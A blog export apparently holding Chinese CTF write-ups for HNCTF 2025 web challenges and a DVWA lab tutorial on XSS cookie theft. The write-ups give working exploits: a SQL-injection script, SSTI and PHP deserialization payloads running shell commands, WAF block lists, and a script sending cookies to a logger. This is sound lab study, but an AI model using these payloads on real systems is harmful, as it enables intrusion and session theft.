[{"title":"2025HNCTF-web复现","url":"/2025/06/27/2025HNCTF-web复现/","content":"# 半成品login\n\n尝试弱密码进行登录\n\nadmin/admin123,成功登录后台\n\n![](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618154732285.png)\n\n根据提示这个后台并不能得到有用的信息\n\n尝试进行sql注入随意输入一个账号和密码登录并进行抓包，得到一下的数据包\n\n![image-20250618160301396](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618160301396.png)\n\n尝试构造sql注入，发现密码的位置存在sql注入\n\n经过测试发现对单引号和or关键字进行了过滤\n\n单引号可以使用双编码绕过，%2527，or关键字可以使用||进行替换\n\n![image-20250618161235375](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618161235375.png)\n\n出入成功，payload为\n\n````\nusername=admin&password=1%2527||1=1#\n````\n\n发现是存在回显的，尝试适应oder by语句查看回显的列数\n\n````\nusername=admin&password=1%2527oder by 4#\n````\n\n没有回显说明这里存在过滤，先考虑是过滤了空格\n\n````\nusername=admin&password=1%2527oder/**/by/**/4#\n````\n\n![image-20250618164253388](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618164253388.png)\n\n![image-20250618164313866](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618164313866.png)\n\n根据两次回显的不同，确定列数为4\n\n测试发现这里的select关键字也被过滤了，考虑到mysql的特性注入\n\n查看当前的mysql的版本\n\n````\nusername=admin&password=1%2537||@@version/**/like/**/%2527%8.%%2527#\n等价于\nusername=admin&password=1'||@@version/**/LIKE/**/'%8.%'#\n````\n\n![image-20250618181121953](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618181121953.png)\n\n可以看见登录成功，说明这里使用的就是mysql8的版本\n\n可以利用table注入，但是需要能够利用的表明，这里可以利用一些而系统视图来实现\n\n以下是别人的wp提供的布尔盲注的脚本。\n\n````\nimport requests\nimport time\n\nurl = \"http://124.71.84.202:10071/login.php\"\nflagstr = \"0123456789:;<=>?@_`abcdefghijklmnopqrstuvwxyz{|}~\"\nheaders = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\"\n}\n\ntempstr = \"\"\nflag = \"\"\n\nfor i in range(1, 15):\n    for idx in range(len(flagstr)):  # 使用索引遍历\n        x = flagstr[idx]  # 获取当前字符\n        prefix = tempstr + x\n\n        # Payload templates\n        payload1 = \"1%27/**/||(%27{}%27,%271%27,%2711%27,%2711%27)<(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#\".format(tempstr+x)\n        # 获得数据库名: hnctfweb\n\n        payload2 = \"1%27/**/||(%27hnctfweb%27,%27{}%27,%2711%27,%2711%27)<(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#\".format(tempstr+x)\n        # 获得表名: hnctfuser\n\n        payload3 = \"1%27/**/||(%27{}%27,%27%27,%271%27,%2711%27)<(table/**/hnctfuser/**/limit/**/1)#\".format(tempstr + x)\n        # 获得第一列id值: 1\n\n        payload4 = \"1%27/**/||(%271%27,%27{}%27,%271%27,%2711%27)<(table/**/hnctfuser/**/limit/**/1)#\".format(tempstr+x)\n        # 获得第二列username值: admin\n\n        payload5 = \"1%27/**/||(%271%27,%27admin%27,%27{}%27,%2711%27)<(table/**/hnctfuser/**/limit/**/1)#\".format(tempstr + x)\n        # 获得第三列password值: admin123\n\n        payload6 = \"1%27/**/||(%271%27,%27admin%27,%27admin123%27,%27{}%27)<(table/**/hnctfuser/**/limit/**/1)#\".format(tempstr + x)\n        # 获得第四列值: noflaginhere\n\n        payload7 = \"1%27/**/||(%27{}%27,%271%27,%271%27,%271%27)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#\".format(tempstr + x)\n        # 获得第一列id值: 2\n\n        payload8 = \"1%27/**/||(%272%27,%27{}%27,%271%27,%271%27)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#\".format(tempstr + x)\n        # 获得需要的关键用户名: hacker*****\n\n        payload9 = \"1%27/**/||(%272%27,%27hackerohtii%27,%27{}%27,%271%27)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#\".format(tempstr + x)\n\n        data = {\n            \"username\": \"admin\",\n            \"password\": payload9\n        }\n\n        res = requests.post(url=url, data=data, allow_redirects=False, headers=headers)\n\n        if \"登陆成功\" in res.text:\n            continue\n        elif \"错误\" in res.text:\n            current_char = flagstr[idx - 1]\n            if current_char == '~':\n                print(\"遇到 ~，提前终止，请确认数据是否正确。\")\n                break\n            tempstr += current_char\n            flag = tempstr\n            print(f\"当前结果: {flag}\")\n            break\n\nprint(f\"最终结果: {flag}\")\n````\n\n下面是对payload的解析\n\n这里table注入利用的表是sys.schema_tables_with_full_table_scans，这个系统视图的数据第一行包含了数据库名和表名\n\n首先是payload1\n\n从左到右循环字符来匹配sys.schema_tables_with_full_table_scans视图表的第一行的数据，首先匹配的就是数据库名\n\npayload2\n\n完成了第一个数据的匹配之后，即确定了数据库名之后进行匹配表名\n\npayload3\n\n成功得到表名之后就可以直接使用table查询表的内容，首先仍然是匹配第一行的第一个数据\n\n接下来就是获取全部的对应表中的第一行的数据，发现没有有价值的信息，接下来在table注入的操作中引入一个**新的关键字offset**，他的作用主要是跳过第一行的数据，直接查看第二行的数据并进行匹配。\n\n还有一个要注意的点就是于PerformanceSchema的机制限制，我们需要现在系统真正的运行一次sql查询才会触发Performance Schema的数据刷新机制，才会在sys.schema_tables_with_full_table_scans视图上面留下需要的信息。\n# 奇怪的咖啡店\n\nf12发现给了源码，发现源码是python写的\n\n````python\nfrom flask import Flask, session, request, render_template_string, render_template\nimport json\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = os.urandom(32).hex()\n\n@app.route('/', methods=['GET', 'POST'])\ndef store():\n    if not session.get('name'):\n        session['name'] = ''.join(\"customer\")\n        session['permission'] = 0\n\n    error_message = ''\n    if request.method == 'POST':\n        error_message = '<p style=\"color: red; font-size: 0.8em;\">该商品暂时⽆法购买，请稍后再试！</p>'\n\n    products = [\n        {\"id\": 1, \"name\": \"美式咖啡\", \"price\": 9.99, \"image\": \"1.png\"},\n        {\"id\": 2, \"name\": \"橙c美式\", \"price\": 19.99, \"image\": \"2.png\"},\n        {\"id\": 3, \"name\": \"摩卡\", \"price\": 29.99, \"image\": \"3.png\"},\n        {\"id\": 4, \"name\": \"卡布奇诺\", \"price\": 19.99, \"image\": \"4.png\"},\n        {\"id\": 5, \"name\": \"冰拿铁\", \"price\": 29.99, \"image\": \"5.png\"}\n    ]\n\n    return render_template('index.html',\n                         error_message=error_message,\n                         session=session,\n                         products=products)\n\ndef add():\n    pass\n\n@app.route('/add', methods=['POST', 'GET'])\ndef adddd():\n    if request.method == 'GET':\n        return '''\n            <html>\n                <body style=\"background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;\">\n                    <h2>添加商品</h2>\n                    <form id=\"productForm\">\n                        <p>商品名称: <input type=\"text\" id=\"name\"></p>\n                        <p>商品价格: <input type=\"text\" id=\"price\"></p>\n                        <button type=\"button\" onclick=\"submitForm()\">添加商品</button>\n                    </form>\n                    <script>\n                        function submitForm() {\n                            const nameInput = document.getElementById('name').value;\n                            const priceInput = document.getElementById('price').value;\n                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {\n                                method: 'POST',\n                                headers: {\n                                    'Content-Type': 'application/json',\n                                },\n                                body: nameInput\n                            })\n                            .then(response => response.text())\n                            .then(data => alert(data))\n                            .catch(error => console.error('错误:', error));\n                        }\n                    </script>\n                </body>\n            </html>\n        '''\n    elif request.method == 'POST':\n        if request.data:\n            try:\n                raw_data = request.data.decode('utf-8')\n                if check(raw_data):\n                    # 检测添加的商品是否合法\n                    return \"该商品违规，⽆法上传\"\n                json_data = json.loads(raw_data)\n                if not isinstance(json_data, dict):\n                    return \"添加失败1\"\n                merge(json_data, add)\n                return \"你⽆法添加商品哦\"\n````\n\n发现了merge()函数\n\n````python\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n````\n\n这是很容易联想到原型污染的一个函数，无论是JavaScript还是python\n\n找一下merge函数的触发点\n\n````\nmerge(json_data, add)\n````\n\n@app.route('/add', methods=['POST', 'GET'])定义了路由在/add下面\n\n```\nraw_data = request.data.decode('utf-8')  # 用户直接控制的输入\njson_data = json.loads(raw_data)         # 解析为字典\n```\n\n发现json_data完全可控\n\n````\n if check(raw_data):\n                    # 检测添加的商品是否合法\n                    return \"该商品违规，⽆法上传\"\n````\n\n这里存在一个check，但是不知道check的是什么内容，可能是给的源码不完整的原因\n\nf12还可以看到图片的位置是在/static/img，图片作为静态文件是从`static` 文件夹提供，实际路径由 `app._static_folder` 属性决定，默认值为 `\"static\"`\n\npayload的分析(这是污染静态路由的操作)，目的是当前的目录跳转到根目录，从而得到完整的源代码\n\n````\n{\n    \"__globals__\": {\n        \"app\": {\n            \"_static_folder\": \"./\"\n        }\n    }\n}\n````\n\n首先打开/add路由，这是一个添加商品的页面，根据上面已知的源代码分析下可以得知这里传参的方式是POST传参\n\n![image-20250625151529071](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250625151529071.png)\n\n可以看到这里通过JSON.loads()解析的数据，所以POST传参payload的时候就需要设置 `Content-Type: application/json` 请求头\n\n![image-20250627033912857](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250627033912857.png)\n\n![image-20250627033931508](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250627033931508.png)\n\n说明是被check过滤了，尝试编码（utf-16的\\u形式）绕过\n\n这样的编码通常应用于在JSON中表示非ascii码的字符\n\n[Unicode 转换器 - Unicode、UTF-16、UTF-8、UTF-32、百分比、Base64 和十进制转换器](https://www.branah.com/unicode-converter)\n\n````\n{\n    \"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\": {\n        \"\\u0061\\u0070\\u0070\": {\n            \"\\u005f\\u005f\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u005f\\u0066\\u006f\\u006c\\u0064\\u0065\\u0072\": \"\\u002e\\u002f\"\n        }\n    }\n}\n````\n\n![image-20250625154201458](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250625154201458.png)\n\n我以为是污染失败了呢，但是尝试直接访问/static/app.py又得到了源码\n\n```python\nfrom flask import Flask, session, request, render_template_string, render_template\nimport json\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = os.urandom(32).hex()\n\n@app.route('/', methods=['GET', 'POST'])\ndef store():\n    if not session.get('name'):\n        session['name'] = ''.join(\"customer\")\n        session['permission'] = 0\n\n    error_message = ''\n    if request.method == 'POST':\n        error_message = '<p style=\"color: red; font-size: 0.8em;\">该商品暂时无法购买，请稍后再试！</p>'\n\n    products = [\n        {\"id\": 1, \"name\": \"美式咖啡\", \"price\": 9.99, \"image\": \"1.png\"},\n        {\"id\": 2, \"name\": \"橙c美式\", \"price\": 19.99, \"image\": \"2.png\"},\n        {\"id\": 3, \"name\": \"摩卡\", \"price\": 29.99, \"image\": \"3.png\"},\n        {\"id\": 4, \"name\": \"卡布奇诺\", \"price\": 19.99, \"image\": \"4.png\"},\n        {\"id\": 5, \"name\": \"冰拿铁\", \"price\": 29.99, \"image\": \"5.png\"}\n    ]\n\n    return render_template('index.html',\n                         error_message=error_message,\n                         session=session,\n                         products=products)\n\n\ndef add():\n    pass\n\n\n@app.route('/add', methods=['POST', 'GET'])\ndef adddd():\n    if request.method == 'GET':\n        return '''\n            <html>\n                <body style=\"background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;\">\n                    <h2>添加商品</h2>\n                    <form id=\"productForm\">\n                        <p>商品名称: <input type=\"text\" id=\"name\"></p>\n                        <p>商品价格: <input type=\"text\" id=\"price\"></p>\n                        <button type=\"button\" onclick=\"submitForm()\">添加商品</button>\n                    </form>\n                    <script>\n                        function submitForm() {\n                            const nameInput = document.getElementById('name').value;\n                            const priceInput = document.getElementById('price').value;\n\n                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {\n                                method: 'POST',\n                                headers: {\n                                    'Content-Type': 'application/json',\n                                },\n                                body: nameInput\n                            })\n                            .then(response => response.text())\n                            .then(data => alert(data))\n                            .catch(error => console.error('错误:', error));\n                        }\n                    </script>\n                </body>\n            </html>\n        '''\n    elif request.method == 'POST':\n        if request.data:\n            try:\n                raw_data = request.data.decode('utf-8')\n                if check(raw_data):\n                #检测添加的商品是否合法\n                    return \"该商品违规，无法上传\"\n                json_data = json.loads(raw_data)\n\n                if not isinstance(json_data, dict):\n                    return \"添加失败1\"\n\n                merge(json_data, add)\n                return \"你无法添加商品哦\"\n\n            except (UnicodeDecodeError, json.JSONDecodeError):\n                return \"添加失败2\"\n            except TypeError as e:\n                return f\"添加失败3\"\n            except Exception as e:\n                return f\"添加失败4\"\n        return \"添加失败5\"\n\n\n@app.route('/aaadminnn', methods=['GET', 'POST'])\ndef admin():\n    if session.get('name') == \"admin\" and session.get('permission') != 0:\n        permission = session.get('permission')\n        if check1(permission):\n            # 检测添加的商品是否合法\n            return \"非法权限\"\n\n        if request.method == 'POST':\n            return '<script>alert(\"上传成功！\");window.location.href=\"/aaadminnn\";</script>'\n\n        upload_form = '''\n        <h2>商品管理系统</h2>\n        <form method=POST enctype=multipart/form-data style=\"margin:20px;padding:20px;border:1px solid #ccc\">\n            <h3>上传新商品</h3>\n            <input type=file name=file required style=\"margin:10px\"><br>\n            <small>支持格式：jpg/png（最大2MB）</small><br>\n            <input type=submit value=\"立即上传\" style=\"margin:10px;padding:5px 20px\">\n        </form>\n        '''\n\n        original_template = 'Hello admin!!!Your permissions are{}'.format(permission)\n        new_template = original_template + upload_form\n\n        return render_template_string(new_template)\n    else:\n        return \"<script>alert('You are not an admin');window.location.href='/'</script>\"\n\n\n\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\n\ndef check(raw_data, forbidden_keywords=None):\n    \"\"\"\n    检查原始数据中是否包含禁止的关键词\n    如果包含禁止关键词返回 True，否则返回 False\n    \"\"\"\n    # 设置默认禁止关键词\n    if forbidden_keywords is None:\n        forbidden_keywords = [\"app\", \"config\", \"init\", \"globals\", \"flag\", \"SECRET\", \"pardir\", \"class\", \"mro\", \"subclasses\", \"builtins\", \"eval\", \"os\", \"open\", \"file\", \"import\", \"cat\", \"ls\", \"/\", \"base\", \"url\", \"read\"]\n\n    # 检查是否包含任何禁止关键词\n    return any(keyword in raw_data for keyword in forbidden_keywords)\n\n\nparam_black_list = ['config', 'session', 'url', '\\\\', '<', '>', '%1c', '%1d', '%1f', '%1e', '%20', '%2b', '%2c', '%3c', '%3e', '%c', '%2f',\n                    'b64decode', 'base64', 'encode', 'chr', '[', ']', 'os', 'cat',  'flag',  'set',  'self', '%', 'file',  'pop(',\n                    'setdefault', 'char', 'lipsum', 'update', '=', 'if', 'print', 'env', 'endfor', 'code', '=' ]\n\n\n# 增强WAF防护\ndef waf_check(value):\n    # 检查是否有不合法的字符\n    for black in param_black_list:\n        if black in value:\n            return False\n    return True\n\n# 检查是否是自动化工具请求\ndef is_automated_request():\n    user_agent = request.headers.get('User-Agent', '').lower()\n    # 如果是常见的自动化工具的 User-Agent，返回 True\n    automated_agents = ['fenjing', 'curl', 'python', 'bot', 'spider']\n    return any(agent in user_agent for agent in automated_agents)\n\ndef check1(value):\n\n    if is_automated_request():\n        print(\"Automated tool detected\")\n        return True\n\n    # 使用WAF机制检查请求的合法性\n    if not waf_check(value):\n        return True\n\n    return False\n\n\napp.run(host=\"0.0.0.0\",port=5014)\n```\n\n直到看到源码中的对POST上传的参数的检测中的代码块\n\n![image-20250625154416313](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250625154416313.png)\n\n原来即使是污染成功了也会返回这句话\n\n分析上面的源码，发现还存在一个/aaadminnn路由\n\n![image-20250625154717204](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250625154717204.png)\n\n他会判断session中是的name是不是等于admin并且检验当前的permission是不是不为0\n\n这里还需要伪造session可以通过污染密钥，permission可以通过ssti更改权限，原因是\n\n````\n permission = session.get('permission')\noriginal_template = 'Hello admin!!!Your permissions are{}'.format(permission)\n        new_template = original_template + upload_form\n\n        return render_template_string(new_template)\n````\n\npermission的值使通过session.get()获得的，水命permission的值完全可控，而且不存在任何过滤，并且他直接拼接到了字符串中并且通过render_template_string()来进行渲染。\n\n\n\n接下来主要的流程就是通过密钥的污染使permission可以使用被污染的密钥进行SSTI\n\n````\n{\n    \"__globals__\": {\n        \"app\": {\n            \"config\": {}\n        }\n    },\n    \"SECRET_KEY\": \"123\"\n}\n````\n\n同样进行编码\n\n````\n{\n        \"__\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073__\" : {\n            \"\\u0061\\u0070\\u0070\" : {\n                \"\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\" : {\n                    \"\\u0053ECRET_KEY\" :\"123\"\n                }\n            }\n        }\n}\n````\n\n成功污染密钥为p\n\n下面是打通的ssti的利用链\n\n````\n{{self.__init__.__globals__.__builtins__[\"__import__\"](\"os\").popen(\"ls\").read()}}\n````\n\nself.__init__.__globals__用于获取当前对象的全局命名空间，`__builtins__` - 这是 Python 的一个内置模块，包含所有内置函数，接着使用import函数导入os模块，再调用os模块中的popen()函数，再用popen()函数执行ls命令，`.read()` - 读取命令执行的结果\n\n这里先要利用一个工具脚本对原本的session进行解密\n\n项目地址：https://github.com/noraj/flask-session-cookie-manager\n\n![image-20250626165608444](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626165608444.png)\n\n````\npython flask_session_cookie_manager3.py decode -s \"123\" -c \"eyJuYW1lIjoiY3VzdG9tZXIiLCJwZXJtaXNzaW9uIjowfQ.aEbpMQ.RzfFYnE7I6sqBcZW2R1PfAxTepk\"\n````\n\n带着解密的session通过GET方式访问\n\n![](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626165812346.png)\n\n得到flag的位置在4flloog中\n\n![image-20250626170157293](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626170157293.png)\n\n````\npython flask_session_cookie_manager3.py encode -s \"123\" -t \"{'name':'admin','permission':'{{self.__init__.__globals__.__builtins__[\\\"__import__\\\"](\\\"os\\\").popen(\\\"cat 4flloog\\\").read()}}'}\"\n````\n\n![](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626224338885.png)\n\n使用上面的session访问即可得到flag。\n# DeceptiFlag\n\nf12查看元素\n\n![image-20250614005929951](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614005929951.png)\n\n发现有一个隐藏输入框的部分试着删除上面的部分，得到另外的一个输入框，根据背景图的提示可以输入和题目提供的hint可以输入xiyangyang和huitailang\n\n![image-20250614010644463](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614010644463.png)\n\n发现上面有一个?file=flag,尝试删除file参数的参数值，发现会报错，分析一下报错内容\n\n尝试加载（require_once)加载一个.php文件的时候报错了，说明之前的参数值为flag的时候读取的是flag.php文件的内容\n\n在f12查看cookie的时候发现存在一个hint\n\n![image-20250614011936495](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614011936495.png)\n\n进行base64解码\n\n![image-20250614012150932](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614012150932.png)\n\n说明flag在这个目录的文件夹下面，直接尝试进行读取\n\n![image-20250614012358171](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614012358171.png)\n\n可以看到这里阻止了直接从根目录进行文件包含\n\n可以想到使用伪协议来读取文件，这里是对本地的磁盘文件进行读取\n\n![image-20250614013355732](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250614013355732.png)\n\n进行base-64解码就可以得到flag了\n\nflag{6d4a7988-954c-4f3f-80ec-713823a65376}\n# ez-php\n\n````php\n<?php\nerror_reporting(0);\nclass GOGOGO{\n    public $dengchao;\n    function __destruct(){\n        echo \"Go Go Go~ 出发喽！\" . $this->dengchao;\n    }\n}\nclass DouBao{\n    public $dao;\n    public $Dagongren;\n    public $Bagongren;\n    function __toString(){\n        if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren) === md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this->Bagongren)) ){\n            call_user_func_array($this->dao, ['诗人我吃！']);\n        }\n    }\n}\nclass HeiCaFei{\n    public $HongCaFei;\n    function __call($name, $arguments){\n        call_user_func_array($this->HongCaFei, [0 => $name]);\n    }\n}\n\nif (isset($_POST['data'])) {\n    $temp = unserialize($_POST['data']);\n    throw new Exception('What do you want to do?');\n} else {\n    highlight_file(__FILE__);\n}\n?>\n````\n\n在反序列化的时候会自动触发destruct()函数进行，destruct()函数可以触发tostring()魔术方法，然后可以触发HeiCaFei下面的__call()魔术方法\n\n这里对post传入的参数进行反序列化之后会抛出一个错误，导致后续的代码无法顺利的执行，就导致反序列化这一操作无法触发destruct()魔术方法。\n\npayload\n\n````php\n<?php\n error_reporting(0);\n class GOGOGO{\n public $dengchao;\n function __destruct(){\n echo \"Go Go Go~\n出发喽！\n\" . $this->dengchao;\n }\n }\n class DouBao{\n public $dao;\n public $Dagongren;\n public $Bagongren;\n function __toString(){\n if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren)\n=== md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this\n>Bagongren)) ){\n echo \"success\";\n call_user_func_array($this->dao, ['\n诗⼈我吃！\n']);\n }\n }\n }\n class HeiCaFei{\n public $HongCaFei;\n function __call($name, $arguments){\n call_user_func_array($this->HongCaFei, [0 => $name]);\n }\n }\n $a = new GOGOGO();\n $b = new DouBao();\n $test1 = new Error(\"payload\", 1);$test2 = new Error(\"payload\", 2);\n $c1 = new HeiCaFei();\n $c2 = new HeiCaFei();\n $c2->HongCaFei = \"system\";\n $c1->HongCaFei = [$c2, \"cat\\${IFS}/of*\"];\n $b->dao = [$c1, 'test'];\n $b->Dagongren = $test1;\n $b->Bagongren = $test2;\n $a->dengchao = $b;\n $pop = array($a, 0);\n # str_replace(\"i:1;i:0;\", \"i:0;i:0;\",\n # echo urlencode(serialize($pop));\n echo str_replace(\"i%3A1%3Bi%3A0%3B%7D\", \"i%3A1%3Bi%3A0%3B\",\nurlencode(serialize($pop)));\n ?>\n````\n\n关于以上的payload的解释\n\n首先实例化两个error类然后将上面的两个error类分别赋值给dagongren和bagongren，这样可以使dagonren和bagongren两个对象本身不相等但是在经过__tostring()魔术方法处理之后的结果相等可以绕过哈希。\n\n然后对Heichafei实例化两个对象$c1,$c2，c1将Heichafei类的hongchafei属性设置为system()函数，这样在call()魔术方法被调用的时候就会调用system()函数，将$c1的hongchafei属性设置为一个数组\n\n`[$c2, \"cat\\${IFS}/of*\"]`在这个对象中对$c2进行了调用，调用之后即为[system, \"cat\\${IFS}/of*\"]\n\n在__call()魔术方法被调用的时候就会进行调用。\n\n`cat\\${IFS}/of*`解释：${IFS}这里是空格的作用，反斜杠使防止对空格符号进行转移。\n\nof*是一种模糊的通配符的匹配模式\n\n$b->dao = [$c1, 'test'];被调用的时候实际调用的是$c1对象中的test()方法，但是$c1对象中没有的test()方法，就会触发__call()魔术方法\n\n将DOUBAO类的实例化的对象赋值给GOGOGO的实例化对象的dengchao属性，可以触发__tostring()魔术方法\n\n定义一个数组$pop = array($a, 0)，其中包含两个元素，0的序列化的内容是i:1;i:0;}，经过替换之后会删掉最后的}导致序列化的数据不完整，前面的内容仍然能够解析，但是由于不完整又能够触发__destruct()魔术方法，从而能够绕过抛出异常。\n\n使用上面得到的payload成功得到flag\n\n![image-20250626224146070](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626224146070.png)\n# Really_Ez_Rce\n\n````php\n<?php\nheader('Content-Type: text/html; charset=utf-8');\nhighlight_file(__FILE__);\nerror_reporting(0);\nif (isset($_REQUEST['Number'])) {\n    $inputNumber = $_REQUEST['Number'];\n\n    if (preg_match('/\\d/', $inputNumber)) {\n        die(\"\n不⾏不⾏\n,\n不能这样\n\");\n    }\n    if (intval($inputNumber)) {\n        echo \"OK,\n接下来你知道该怎么做吗\n\";\n\n        if (isset($_POST['cmd'])) {\n            $cmd = $_POST['cmd'];\n\n            if (!preg_match(\n                '/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|\n od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|bas\n e|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\\n [|\\]|flag|bash|env|!|\\?|ls|\\'|\\\"|id/i',\n                $cmd\n            )) {\n                echo \"\n你传的参数似乎挺正经的\n,\n放你过去吧\n<br>\";\n                system($cmd);\n            } else {\n                echo \"nonono,hacker!!!\";\n            }\n        }\n    }\n}\n````\n\n首先使用正则过滤了数字，使Number参数的参数值不能是数字，`intval()`函数用于将变量转化为整数类型，用于确保用户输入的值为整数。\n\n这里可以用数组绕过\n\n````\n?Number[]=1\n````\n\n接下来是对POST传参的`cmd`的值进行的过滤，所有的相关的关键字和通配符，点号等都被过滤了\n\n可以用拼接绕过来查看根目录下面有什么文件\n\n````\ncmd=a=l;b=s;$a$b /\n````\n\n得到根目录下面有一个`flag.txt`文件\n\ncat 命令也可以通过拼接出来\n\n````\ncmd=a=c;b=a;c=t;d=fl;e=ag;f=tx;g=t;$a$b$c /$d$e.$f$g\n````\n\n![image-20250609150836285](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250609150836285.png)\n\n可以看到因为文件名中的点号的原因被过滤了，实在是想不到怎么绕过这个点号了，看了大佬的`wp`发现这里的绕过方式是通过ls和head命令配合使用，如下：\n\n````\nls -a | head -n 1\n````\n\n首先ls -a会显示当前 目录下面的所有的隐藏文件(包括以点号开头的所有隐藏文件)\n\nhead命令用来限制文件名的输出，比如head -n 行数 （只返回前几行）\n\n![image-20250609152134469](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250609152134469.png)\n\n传ls -a命令可以看到第一个隐藏的文件名就是点号，所以使用head -n 1就可以提取到第一行的文件名(就是点号)\n\npayload\n\n````\ncmd=a=c;b=at;c=f;d=lag;e=t;f=xt;g=l;h=s;i=h;j=ead;k=$($g$h -a | $i$j -n 1);$a$b\n /$c$d$k$e$f\n 管道符的作用是将ls -a 的输出传递给head命令进行处理\n 括号外的$符号的作用是表示首先执行括号内的命令，然后将输出结果作为字符串替换到当前位置。\n````\n\n![image-20250609153423167](https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250609153423167.png)\n"},{"title":"XSS漏洞的两个具体的利用方式","url":"/2025/05/28/XSS漏洞的两个具体的利用方式/","content":"### 1.**窃取网页浏览中的cookie值**\n\n用户登陆完成之后，网页一般会返回一个cookie值，相当于一个令牌可以直接进行登陆。\n\n如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。\n\n**具体攻击：**\n\n##### 靶场实践\n\nDVWA     等级low\n\n![image-20250518152910272](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181529336.png)\n\n尝试输入最简单的弹窗payload\n\n````\n<script>alert(/xss/)</script>\n````\n\n![image-20250518153016694](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181530775.png)\n\n弹窗成功\n\n查看源码\n\n````php\n<?php\n\nheader (\"X-XSS-Protection: 0\");\n\n// Is there any input?\nif( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) {\n    // Feedback for end user\n    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';\n}\n\n?>\n````\n\n简单的get传参,参数为name，无任何过滤\n\n本地利用xss获得cookie值\n\nhacker.js\n\n````\nvar img = new Image();\nimg.src=\"http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.php?x=\" + document.cookie;\ndocument.body.append(img);\n````\n\nhacker.php\n\n````\n<?php\n$cookie = $_GET['x'];\n$ip = getenv ('REMOTE_ADDR');\n$time = date('Y-m-d g:i:s');\n$fp = fopen(\"cookie.txt\",\"a\");\nfwrite($fp,\"IP: \".$ip.\"Date: \".$time.\" Cookie:\".$cookie.\"\\n\");\nfclose($fp);\n?>\n````\n\n构造一个payload\n\n````\nhttp://localhost/DVWA-master/vulnerabilities/xss_r/?name=<script src=\"http://localhost/DVWA-master/vulnerabilities/xss_r/hacker.js\" 